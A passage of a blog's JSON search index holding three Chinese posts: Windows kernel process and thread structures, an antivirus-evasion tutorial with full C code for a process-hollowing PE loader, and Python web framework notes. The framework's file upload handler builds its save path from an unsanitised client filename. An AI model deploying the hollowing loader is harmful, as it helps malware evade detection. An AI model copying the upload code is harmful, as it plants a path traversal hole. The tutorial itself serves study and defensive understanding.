0;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://joe1sn.eu.org/tags/cpp/"}]},{"title":"【win内核原理与实现】II. 进程与线程","slug":"windows-kernel-2-process&thread","date":"2023-06-14T01:41:52.000Z","updated":"2023-06-14T03:10:04.422Z","comments":true,"path":"2023/06/14/windows-kernel-2-process&thread/","link":"","permalink":"https://joe1sn.eu.org/2023/06/14/windows-kernel-2-process&thread/","excerpt":"Windows中进程与线程的设置","text":"Windows中进程与线程的设置 关于进程与线程 操作系统“复习” ​ 在学习操作系统的时候，有个重点就是进程与线程的区别。最开始进程和线程是没有分开的，由于多数操作系统分开了用户态和内核态，那么用户态就必须和内核态进行交互才能调用系统资源（通过IOCTL交互）。这样每一个进程在内核当中都有一个“进程描述符”的东西来描述这个进程，并根据调度算法完成进程的运行。这里就假设一个进程test.exe调用了0x40大小的内存空间，在只有进程的时候，进程描述符中就会标记这个内存被这个进程使用，同时指令和运行都在其中。 ​ 这样有个问题就是，我需要两个这种“进程”来运行，且他们需要的恰好是同一块内存的相同数据，如果只有进程的话，就会存在两个0x40的内存，同时造成不必要的复制粘贴。随后就有了线程这个概念，比如面对上述情况，进程就只含有一个0x40大小的内存，对内存的访问就交给这个线程对应的进程。 进程和程序 ​ Windows的任务调度算法可以很好地适应多处理器和多任务的情形，在windows中的进程也遵守上述的准则。对于Windows内核需要做的事情是：维护一个全局的进程表，记录下当前有哪些进程正 在被执行；把时间分成适当的片段，在现代处理器结构中，这可以通过设置时钟中断来完成，因而每次时钟中断到来时系统就会获得控制权；在进程间实施切换，即保留上一个进 程的环境信息，恢复下一个进程的执行环境。关于Windows的调度算法可以简单理解为时间轮。 ​ 如果程序是一个完全的模块，那么他的内存就是我们熟悉的经典内存结构。 ​ 但是往往一个最简单的helloworld也会调用CRunTime的代码，所以有进程就能使用 共享内存 ，比如在静态数据区有着一份复制。 线程 ​ 线程不仅仅是一个控制流，它还有更多的内容。线程的调用栈（call stack）记录了它 作为控制流的状态信息，包括每一层函数调用和返回的指令地址。线程一定隶属于某个进 程，其控制流可以访问这个进程中的资源，包括所有的内存数据以及系统分配给此进程的 其他资源。一个进程可以有多个线程，由于这些线程隶属于同一个进程，所以它们之间相 互通信要方便得多，毕竟几乎所有的资源（并非全部）对于它们来说都是共享的。 Windows 中进程和线程的数据结构 内核层的进程和线程对象 在内核当中的描述为KPROCESS和KTHREAD。 在WRK中的定义为 123456789101112131415161718192021222324252627282930313233343536373839404142434445typedef struct _KPROCESS&#123; DISPATCHER_HEADER Header; //表明是分发器对象，可用于等待。进程退出时，此对象为有信号状态 LIST_ENTRY ProfileListHead; //进程参与性能分析时，作为节点加入全局性能分析进程链表。 ULONG DirectoryTableBase; // 两个成员的数组，第一个指向页目录表地址，第二个指向超空间的页目录表地址 ULONG Unused0; KGDTENTRY LdtDescriptor; //LDT的描述符 KIDTENTRY Int21Descriptor; //为了兼容DOS，通过int 21h调用系统功能 WORD IopmOffset; //指定IOPM（IO权限表，IO Privilege Map）位置。控制进程的用户模式IO访问权限 UCHAR Iopl; //IO优先级（IO Privilege Level） UCHAR Unused; ULONG ActiveProcessors; //记录进程正在哪些处理器上运行 ULONG KernelTime; //在内核模式运行所花时间 ULONG UserTime; //在用户模式运行所花时间 LIST_ENTRY ReadyListHead; //保存进程中处于就绪状态但未被加入全局就绪链表的线程 SINGLE_LIST_ENTRY SwapListEntry; //进程要被换出时，通过此域加入到KiProcessOutSwapListHead为头的单链表 PVOID VdmTrapcHandler; //VDM环境下运行16位程序时，处理Ctrl+C中断的函数 LIST_ENTRY ThreadListHead; //指向一个链表头，链表中包含该进程的所有线程 ULONG ProcessLock; //一个自旋锁对象。保证对进程数据结构中成员的互斥访问 ULONG Affinity; //指定该进程的线程可以在哪些处理器上运行 union &#123; ULONG AutoAlignment: 1; ULONG DisableBoost: 1; // ULONG DisableQuantum: 1; ULONG ReservedFlags: 29; LONG ProcessFlags; &#125;; CHAR BasePriority; //该进程的线程的基本优先级 CHAR QuantumReset; //进程中线程的基本时限重置值 UCHAR State; //说明进程是否在内存中 UCHAR ThreadSeed; //该进程的下一个创建线程的理想处理器 UCHAR PowerState; //电源状态 UCHAR IdealNode; //进程优先选择的处理器节点 UCHAR Visited; union &#123; KEXECUTE_OPTIONS Flags; UCHAR ExecuteOptions; //NX执行选项 &#125;; ULONG StackCount; //当前进程中有多少个线程的栈位于内存中 LIST_ENTRY ProcessListEntry; //当前系统中所有具有活动线程的进程通过这个域串成一个链表 UINT64 CycleTime;&#125; KPROCESS, *PKPROCESS; 那么在线程当中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181typedef struct _KTHREAD&#123; DISPATCHER_HEADER Header; UINT64 CycleTime; ULONG HighCycleTime; UINT64 QuantumTarget; PVOID InitialStack; PVOID StackLimit; PVOID KernelStack; ULONG ThreadLock; union &#123; KAPC_STATE ApcState; UCHAR ApcStateFill[23]; &#125;; CHAR Priority; WORD NextProcessor; WORD DeferredProcessor; ULONG ApcQueueLock; ULONG ContextSwitches; UCHAR State; UCHAR NpxState; UCHAR WaitIrql; CHAR WaitMode; LONG WaitStatus; union &#123; PKWAIT_BLOCK WaitBlockList; PKGATE GateObject; &#125;; union &#123; ULONG KernelStackResident: 1; ULONG ReadyTransition: 1; ULONG ProcessReadyQueue: 1; ULONG WaitNext: 1; ULONG SystemAffinityActive: 1; ULONG Alertable: 1; ULONG GdiFlushActive: 1; ULONG Reserved: 25; LONG MiscFlags; &#125;; UCHAR WaitReason; UCHAR SwapBusy; UCHAR Alerted[2]; union &#123; LIST_ENTRY WaitListEntry; SINGLE_LIST_ENTRY SwapListEntry; &#125;; PKQUEUE Queue; ULONG WaitTime; union &#123; struct &#123; SHORT KernelApcDisable; SHORT SpecialApcDisable; &#125;; ULONG CombinedApcDisable; &#125;; PVOID Teb; union &#123; KTIMER Timer; UCHAR TimerFill[40]; &#125;; union &#123; ULONG AutoAlignment: 1; ULONG DisableBoost: 1; ULONG EtwStackTraceApc1Inserted: 1; ULONG EtwStackTraceApc2Inserted: 1; ULONG CycleChargePending: 1; ULONG CalloutActive: 1; ULONG ApcQueueable: 1; ULONG EnableStackSwap: 1; ULONG GuiThread: 1; ULONG ReservedFlags: 23; LONG ThreadFlags; &#125;; union &#123; KWAIT_BLOCK WaitBlock[4]; struct &#123; UCHAR WaitBlockFill0[23]; UCHAR IdealProcessor; &#125;; struct &#123; UCHAR WaitBlockFill1[47]; CHAR PreviousMode; &#125;; struct &#123; UCHAR WaitBlockFill2[71]; UCHAR ResourceIndex; &#125;; UCHAR WaitBlockFill3[95]; &#125;; UCHAR LargeStack; LIST_ENTRY QueueListEntry; PKTRAP_FRAME TrapFrame; PVOID FirstArgument; union &#123; PVOID CallbackStack; ULONG CallbackDepth; &#125;; PVOID ServiceTable; UCHAR ApcStateIndex; CHAR BasePriority; CHAR PriorityDecrement; UCHAR Preempted; UCHAR AdjustReason; CHAR AdjustIncrement; UCHAR Spare01; CHAR Saturation; ULONG SystemCallNumber; ULONG Spare02; ULONG UserAffinity; PKPROCESS Process; ULONG Affinity; PKAPC_STATE ApcStatePointer[2]; union &#123; KAPC_STATE SavedApcState; UCHAR SavedApcStateFill[23]; &#125;; CHAR FreezeCount; CHAR SuspendCount; UCHAR UserIdealProcessor; UCHAR Spare03; UCHAR Iopl; PVOID Win32Thread; PVOID StackBase; union &#123; KAPC SuspendApc; struct &#123; UCHAR SuspendApcFill0[1]; CHAR Spare04; &#125;; struct &#123; UCHAR SuspendApcFill1[3]; UCHAR QuantumReset; &#125;; struct &#123; UCHAR SuspendApcFill2[4]; ULONG KernelTime; &#125;; struct &#123; UCHAR SuspendApcFill3[36]; PKPRCB WaitPrcb; &#125;; struct &#123; UCHAR SuspendApcFill4[40]; PVOID LegoData; &#125;; UCHAR SuspendApcFill5[47]; &#125;; UCHAR PowerState; ULONG UserTime; union &#123; KSEMAPHORE SuspendSemaphore; UCHAR SuspendSemaphorefill[20]; &#125;; ULONG SListFaultCount; LIST_ENTRY ThreadListEntry; LIST_ENTRY MutantListHead; PVOID SListFaultAddress; PVOID MdlForLockedTeb;&#125; KTHREAD, *PKTHREAD; Header：说明该对象是一个分发器对象，可以被等待。线程结束时，等待被满足。 MutantListHead：指向一个链表头。链表中包含所有属于该线程的突变体对象（mutant，对应互斥体对象）。 InitialStack：原始栈位置（高地址） StackLimit：栈低地址 KernelStack：内核调用栈开始位置 StackBase：当前栈的基地址。 ThreadLock：自旋锁，用于保护线程数据成员。 ApcState：KAPC_STATE结构，指定线程的APC信息，包括APC链表，是否有APC正在等待，是否正在处理APC。 ApcQueueable：是否可插入APC NextProcessor：关于处理器调度的选择。 DeferredProcessor：关于处理器调度的选择。 AdjustReason：优先级调整原因 AdjustIncrement：优先级调整调整量 ApcQueueLock：保护APC队列的自旋锁。 ContextSwitches：记录线程进行了多少次切换。 State：线程当前状态。 NpxState：浮点处理器状态。 Alertable：线程是否可以被唤醒。 WaitNext： WaitIrql：原先的IRQL。 WaitReason：等待原因 WaitMode：线程等待时的处理器模式，内核or用户 WaitStatus：等待的结果状态。 WaitBlockList：KWAIT_BLOCK为元素的链表，记录线程所有等待的分发器对象。每个分发器对象也有一个KWAIT_BLOCK组成的链表，记录所有等待在该对象的线程。 GateObject：等待的门对象，等待门对象和等待分发器对象不会同时发生。 Priority：动态优先级。 BasePriority：基本优先级。 PriorityDecrement：优先级动态调整过程中的递减值。 Saturation：线程基本优先级调整相对于进程基本优先级是否超过了区间的一半。 EnableStackSwap：内核栈是否准许被换出。 SwapBusy：当前是否正在进程上下文切换。 Alerted：线程在警告模式下是否可以被唤醒。 WaitListEntry：双向链表节点，等待被执行时，作为节点加入某链表 SwapListEntry：单链表节点，内核栈需要被换出时，加入KiStackInSwapListHead为头的链表。另外，线程处于DeferredReady状态时加入DeferredReadyListHead为头的链表。 Queue：队列分发器对象，线程正在处理此队列中的项。 WaitTime：线程进入等待时刻的时间点。 KernelApcDisable/SpecialApcDisable：内核APC和特殊内核APC是否被禁止。 TEB：进程地址空间的一个TEB域 Timer：定时器。 AutoAlignment：与KPROCESS相同 DisableBoost：与KPROCESS相同 WaitBlock：4个KWAIT_BLOCK成员的数组，线程等待的分发器少于4个时，使用这里的空间，不分配新空间。 QueueListEntry：线程处理一个队列项时，加入到队列对象的线程链表中的地址。 TrapFrame：指向KTRAP_FRAME类型的指针。用户保存执行现场。 CallbackStack：线程的回调栈地址，在从内核模式返回用户模式时用。 ServiceTable： 指向系统使用的系统服务表，非GUI线程为KeServiceDescriptorTable，GUI线程为KeServiceDescriptorTableShadow。 IdealProcess：理想处理器 Preempted：是否被高优先级线程抢占了。 ProcessReadyQueue：是否在进程对象的ReadyListHead列表中。 KernelStackResident：线程的内核栈是否驻留在线程中。 Affinity：处理器亲和性，为线程指定的处理器集合必须是该集合的子集。 UserAffinity：线程的用户亲和性。 Process：执行线程的进程对象。 ApcStateIndex：指明当前APC状态在ApcStatePointer域中的索引。 Win32Thread：指向Windows子系统管理的区域的指针。 SuspendApc/SuspendSemaphore：用于支持线程挂起的域。 ThreadListEntry：双链表的节点，线程被创建时，加入到进程的ThreadListHead链表中。 SListFaultAddress：上一次用户模式互锁单链表POP操作发生页面错误的地址。 SuspendSemaphore：与上面有关。","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"【免杀】内存加载PE文件","slug":"pe-loader","date":"2023-06-13T00:46:20.000Z","updated":"2023-06-13T05:14:54.198Z","comments":true,"path":"2023/06/13/pe-loader/","link":"","permalink":"https://joe1sn.eu.org/2023/06/13/pe-loader/","excerpt":"使用windows API编写PE文件加载器（Loader） 目前支支持32位","text":"使用windows API编写PE文件加载器（Loader） 目前支支持32位 PE文件结构 在《逆向工程核心原理》中讲的已经很详细了，这里主要面向32位的可执行程序来讲解。 DOS头和PE头统称为PE头，下面的部分称之为PE体。 DOS头 DOS头的文件结构 123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // 文件最后一页的字节数 WORD e_cp; // 文件中的页数 WORD e_crlc; // 重定位 WORD e_cparhdr; // 段中头大小 WORD e_minalloc; // 需要最少的额外段落 WORD e_maxalloc; // 需要最多的额外段落 WORD e_ss; // 初始（相对）SS 值 WORD e_sp; // 初始SP值 WORD e_csum; // Checksum WORD e_ip; // 初始 IP 值 WORD e_cs; // 初始（相对）CS 值 WORD e_lfarlc; // 重定位表的文件地址 WORD e_ovno; // 叠加数 WORD e_res[4]; // 保留字 WORD e_oemid; // OEM 标识符（用于 e_oeminfo） WORD e_oeminfo; // OEM信息； e_oemid 具体 WORD e_res2[10]; // 保留字 LONG e_lfanew; // 新exe头文件地址 &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; 其中DOS头有一个很重要的部分e_lfanew，他指向了exe的文件头，在我们编写的loader获取头的部分 12DOSHeader = PIMAGE_DOS_HEADER(Image); //得到DOS头NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew); //得到PE头 NT头 那么关于NT文件头 12345678910typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; //文件类型 // IMAGE_DOS_SIGNATURE 0x5A4D // MZ // IMAGE_OS2_SIGNATURE 0x454E // NE // IMAGE_OS2_SIGNATURE_LE 0x454C // LE // IMAGE_VXD_SIGNATURE 0x454C // LE // IMAGE_NT_SIGNATURE 0x00004550 // PE00 IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 这个文件头很关键，Signature可以判断类型，FileHeader即文件头，可以从NumberOfSections获得节区数目。 OPTIONAL_HEADER结构体如下 123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; OPTIONAL_HEADER中记载了很多详细信息，其中有用的就是ImageBase、SizeOfHeaders和AddressOfEntryPoint ImageBase：描写在虚拟内存中（不了解操作系统的话可以理解为程序启动的基地址）的地址 SizeOfHeaders：记录了整个PE头的大小（包含DOS头），方便控制写入程序的大小 AddressOfEntryPoint：记录程序入口代码起始地址，比如ImageBase可能为0x4000，AddressOfEntryPoint可能为0x4100。 IAT导入表 Windows为了知道使用了那些函数，会导入这些函数的表，从导入表到动态链接中查找函数。每一个节都会有一个导入表，每一个表的信息有40字节，那么找到表的地址就是base + count*40，其中base为DOSHeader-&gt;e_lfanew+248，这里是导入表的初始地址的指针。 进程结构 Pre- PEB 这部分是铺垫的内容，主要描述的就是几个基础寄存器。 这些寄存器是CPU中设计好的， CS (Code Segment Register)：代码段的段基址 DS(Data Segment Register)：数据段的段基址 ES(Extra Segment Register)：其值为附加数据段的段基值，称为“附加”是因为此段寄存器用途不像其他 sreg 那样固定，可以额外做他用。 FS(Extra Segment Register)：其值为附加数据段的段基值 GS：同上 SS(Stack Segment Register)：堆栈段寄存器 在实模式中，CS、DS、ES、SS中的值是物理地址 在保护模式中，装入寄存器的是段选择子FS 其中最重要的就是 FS寄存器。在保护模式下，x86处理器使用段描述符来管理内存，将内存划分为不同的段，如代码段、数据段、堆栈段等。段选择子是一个16位的值，用于标识特定段的起始地址和访问权限。 FS寄存器主要有两个作用： 定位线程局部存储（Thread Local Storage，TLS）： 在多线程程序中，每个线程通常都有自己的TLS，用于存储线程本地的数据，如线程特定变量。 FS寄存器中存储了一个特殊的段选择子，用于定位线程的TLS。 线程可以通过访问FS寄存器来访问自己的TLS。 访问段描述符表（Global Descriptor Table，GDT）： GDT是一个表格，用于存储段描述符的信息，包括段的起始地址、大小、访问权限等。 FS寄存器中存储了GDT中的一个段选择子，该段选择子指向了一个描述线程局部存储段的段描述符。 当线程需要访问TLS时，通过访问FS寄存器中的段选择子，可以获得TLS的起始地址和访问权限。 PEB PEB全称是 Process Environment Block，进程环境块 为了获取PEB的消息可以直接从FS段选择子找到TEB（线程环境块），再从TEB找到PEB，这里可以CTX-&gt;Ebx + 8找到PEB 编程相关 创建一个进程我们可以使用CreateProcess函数 新进程在调用进程的安全上下文中运行。 如果调用进程正在模拟其他用户，则新进程将令牌用于调用进程，而不是模拟令牌。 若要在模拟令牌表示的用户的安全上下文中运行新进程，请使用 CreateProcessAsUser 或 CreateProcessWithLogonW 函数。 123456789101112BOOL CreateProcessA( [in, optional] LPCSTR lpApplicationName, [in, out, optional] LPSTR lpCommandLine, [in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes, [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] BOOL bInheritHandles, [in] DWORD dwCreationFlags, [in, optional] LPVOID lpEnvironment, [in, optional] LPCSTR lpCurrentDirectory, [in] LPSTARTUPINFOA lpStartupInfo, [out] LPPROCESS_INFORMATION lpProcessInformation); lpApplicationName：exe的文件路径，比如c:\\test.exe lpCommandLine：要执行该程序时的参数 bInheritHandles：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。 如果参数为 FALSE，则不继承句柄。 dwCreationFlags：控制优先级类和进程的创建的标志。 lpProcessInformation：进程信息 windows中使用PROCESS_INFORMATION描述 123456typedef struct _PROCESS_INFORMATION &#123; HANDLE hProcess; //新创建的进程的句柄。 句柄用于在对进程对象执行操作的所有函数中指定进程。 HANDLE hThread; //新创建的进程的主线程的句柄。 句柄用于在线程对象上执行操作的所有函数中指定线程。 DWORD dwProcessId; //可用于标识进程的值。 从创建进程到进程的所有句柄关闭并释放进程对象为止，该值有效;此时，可以重复使用标识符。 DWORD dwThreadId; //可用于标识线程的值。 在线程创建到线程的所有句柄关闭且线程对象释放之前，该值有效;此时，可以重复使用标识符。&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; lpStartupInfo：启动时的信息 同时如果要开启一个进程的话需要向其提供基础环境，windows中为STARTUPINFOA，指定创建时进程的主窗口的窗口工作站、桌面、标准句柄和外观。 12345678910111213typedef struct _STARTUPINFOA &#123; DWORD cb; //结构大小（以字节为单位）。 LPSTR lpReserved; //保留;必须为 NULL ... DWORD dwFlags; //一个位字段，用于确定进程创建窗口时是否使用某些 STARTUPINFO 成员。 此成员可以是以下一个或多个值。 //参考 https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa ... WORD cbReserved2; //保留供 C 运行时使用;必须为零。 LPBYTE lpReserved2; //保留供 C 运行时使用;必须为 NULL。 HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;&#125; STARTUPINFOA, *LPSTARTUPINFOA; 最后创建好的进程就在lpProcessInformation的hProcess中了 编写Loader（进程镂空） 知道了加载过程，那么 获得DOS头，从而获得NT头 检查是否为正确的文件格式（PE） 初始化进程信息和启动时信息 创建当前程序进程的副本，并将副本设置为暂停 根据上下文信息找到导入表和PEB 复制导入表和PEB，将EAX设置为待加载PE文件的入口地址DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint; 恢复暂停的副本，运行加载的PE文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;TlHelp32.h&gt;int RunPe(HANDLE Image)&#123; IMAGE_DOS_HEADER* DOSHeader; //DOS文件头 IMAGE_NT_HEADERS* NTHeader; //PE文件头 IMAGE_SECTION_HEADER* SectionHeader; //节头 PROCESS_INFORMATION PI; //进程信息 STARTUPINFOA SI; //启动信息 DWORD* ImageBase; //VAR基地址 void* pImageBase; //指向头的指针 int count; char FilePath[1024]; DOSHeader = PIMAGE_DOS_HEADER(Image); //得到DOS头 NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew); //得到PE头 GetModuleFileNameA(0, FilePath, 1024); if (NTHeader-&gt;Signature == IMAGE_NT_SIGNATURE) &#123; //检查是否为PE文件 ZeroMemory(&amp;PI, sizeof(PI)); ZeroMemory(&amp;SI, sizeof(SI)); if (CreateProcessA(FilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;SI, &amp;PI)) &#123; //创建当前进程的暂停副本 CONTEXT *CTX = PCONTEXT(VirtualAlloc(NULL,sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); CTX-&gt;ContextFlags = CONTEXT_FULL; //创建上下文 if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) &#123; //如果上下文在线程中 //读取指令 ReadProcessMemory(PI.hProcess, LPCVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;ImageBase), 4, 0); pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NTHeader-&gt;OptionalHeader.ImageBase), NTHeader-&gt;OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE); // 向进程的暂停副本写入指令 WriteProcessMemory(PI.hProcess, pImageBase, Image, NTHeader-&gt;OptionalHeader.SizeOfHeaders, NULL); for (count = 0; count &lt; NTHeader-&gt;FileHeader.NumberOfSections; count++) &#123; SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader-&gt;e_lfanew+248+(count*40)); WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader-&gt;VirtualAddress), LPVOID(DWORD(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, 0); &#125; WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;NTHeader-&gt;OptionalHeader.ImageBase), 4, 0); //将入口地址放入EAX寄存器 CTX-&gt;Eax = DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint; SetThreadContext(PI.hThread, LPCONTEXT(CTX)); ResumeThread(PI.hThread); return 1; &#125; &#125; &#125;&#125;unsigned char rawData[91209] = &#123;...&#125;;int main()&#123; RunPe(rawData); //getchar(); return 0;&#125;","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]},{"title":"【Muud开发】2.HTTP服务改善","slug":"web-0x2","date":"2023-06-01T12:15:29.000Z","updated":"2023-06-06T07:15:20.342Z","comments":true,"path":"2023/06/01/web-0x2/","link":"","permalink":"https://joe1sn.eu.org/2023/06/01/web-0x2/","excerpt":"从0到1开发一个勉强能用的python web“框架” 项目地址：https://github.com/Joe1sn/muud","text":"从0到1开发一个勉强能用的python web“框架” 项目地址：https://github.com/Joe1sn/muud 主要改进 6-1 返回报文设置 首先将原来的拼接字符串改为了Response类，实现HTTP报文字段的自定义 这样可以大大简化view.py中的代码 123456789101112131415161718192021class Response(): def __init__(self, type=&quot;json&quot;, status_code=200, reply=&quot;&quot;) -&gt; None: self.content_type = content_types[type] self.status_code = status_code if type == &quot;json&quot;: self.reply = json.dumps(reply, ensure_ascii=False).encode(&#x27;unicode_escape&#x27;).decode() else: self.reply = reply self.length = len(self.reply) def consum(self) -&gt; str: result = &quot;&quot; result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code]) result += &quot;Content-Type: &#123;type&#125;\\r\\n&quot;.format( type = self.content_type) result += &quot;Content-Length: &#123;length&#125;\\r\\n&quot;.format( length=self.length) result += &quot;\\r\\n&quot; result += self.reply return result 这样就可以更简单的编写视图函数 12345@http_apidef html_test(http_request): data = &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello, world!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot; result = Response(reply=data,type=&quot;html&quot;) return result.consum().encode() 不过任然欠缺文件服务，不过在epoll服务器的send部分修改就行了，更复杂的还涉及到文件上传等，后续实现http.server这种服务效果，不然静态网页加载很麻烦。 6-2 设置更多的content_type 123456789101112131415161718192021content_types = &#123; &quot;text&quot;: &quot;text/plain&quot;, &quot;html&quot;: &quot;text/html&quot;, #HTML文档 &quot;css&quot; : &quot;text/css&quot;, #CSS样式表 &quot;js&quot; : &quot;text/javascript&quot;, #JavaScript脚本 &quot;json&quot;: &quot;application/json&quot;, &quot;pdf&quot;: &quot;application/pdf&quot;, &quot;xml&quot;: &quot;application/xml&quot;, &quot;bin&quot;: &quot;application/octet-stream&quot;, #[特质] &quot;jpeg&quot;: &quot;image/jpeg&quot;, #JPEG图像 &quot;png&quot;: &quot;image/png&quot;, #PNG图像 &quot;gif&quot;: &quot;image/gif&quot;, #GIF图像 &quot;mpeg&quot;: &quot;audio/mpeg&quot;, #MPEG音频 &quot;wav&quot;: &quot;audio/wav&quot;, #WAV音频 &quot;mp4&quot; : &quot;video/mp4&quot;, #MP4视频 &quot;mpeg&quot; : &quot;video/mpeg&quot;, #MPEG视频&#125; Response的返回改为bytes类型 123456789101112131415def consum(self) -&gt; bytes: result = &quot;&quot; result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code]) result += &quot;Content-Type: &#123;type&#125;\\r\\n&quot;.format( type = self.content_type) result += &quot;Content-Length: &#123;length&#125;\\r\\n&quot;.format( length=self.length) result += &quot;\\r\\n&quot; result = result.encode() if type(self.reply) == bytes: result += self.reply else: result += self.reply.encode() return result 这样就能直接访问各种文件了，方便下一步渲染 1234567@http_apidef file_test(http_request): result=&quot;&quot; with open(r&quot;/mnt/d/Github/muud/test/test.pdf&quot;,&quot;rb&quot;) as f: result = f.read() result = Response(reply=result,type=&quot;pdf&quot;) return result.consum() 6-3~4 文件上传 这部分写的挺久的，因为涉及到epoll模型的改善，后面回继续改进这个模块 首先有这两个视图函数 1234567891011121314151617181920@http_apidef file_upload(http_request): result=&quot;&quot; with open(r&quot;/mnt/d/Github/muud/test/file_upload.html&quot;,&quot;rb&quot;) as f: result = f.read() result = Response(reply=result,type=&quot;html&quot;) return result.consum()@http_apidef upload(http_request): result=&quot;&quot; info(&quot;FILE Content&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;) # info(http_request.data[&quot;len&quot;]/1024,&quot;KB&quot;) name = http_request.data[&quot;filename&quot;] # print(http_request.data[&quot;file&quot;][:0x20]) with open(r&quot;/mnt/d/Github/muud/test/&quot;+name,&quot;wb&quot;) as f: result = f.write(http_request.data[&quot;file&quot;]) data = &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;okok&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot; result = Response(reply=data,type=&quot;html&quot;,status_code=200) return result.consum() 目前参考了Django的上传，把数据结果收集在request中然后处理 那么就涉及HttpRequest的处理 首先新增了两个字段 12self.length = 0 #总长度self.cur_len = 0 #当前长度 从这个判断文件上传是否完成，然后就是消息的提取 1234567891011121314151617181920212223#文件上传，返回bytes类型数据elif &quot;multipart&quot; in content_type: pre_len = len(self.raw_data.split(b&quot;\\r\\n\\r\\n&quot;)[0])+4 raw_data = self.raw_data[pre_len:] self.cur_len = len(raw_data) self.data=&#123;&quot;name&quot;:&quot;&quot;, &quot;filename&quot;:&quot;&quot;, &quot;file&quot;:b&quot;&quot;, &quot;len&quot;:0&#125; boundary = b&quot;--&quot; + r_boundary.search(self.raw_data).group(1) file_info = raw_data.split(boundary)[1].split(b&quot;\\r\\n&quot;)[1] for attribute in file_info.split(b&quot;; &quot;): # 获得名字 if b&quot;name&quot; in attribute and b&quot;=&quot; in attribute and not attribute.lower().startswith(b&quot;content&quot;): if attribute.split(b&quot;=&quot;)[0] == b&quot;name&quot;: self.data[&quot;name&quot;] = b&quot;&quot;.join(attribute.split(b&quot;=&quot;)[1:])[1:-1].decode() elif attribute.split(b&quot;=&quot;)[0] == b&quot;filename&quot;: # 获得原始文件名 self.data[&quot;filename&quot;] = b&quot;&quot;.join(attribute.split(b&quot;=&quot;)[1:])[1:-1].decode() file_type = raw_data.split(boundary)[1].split(b&quot;\\r\\n&quot;)[2] pre_len = len(file_info) + len(file_type) + 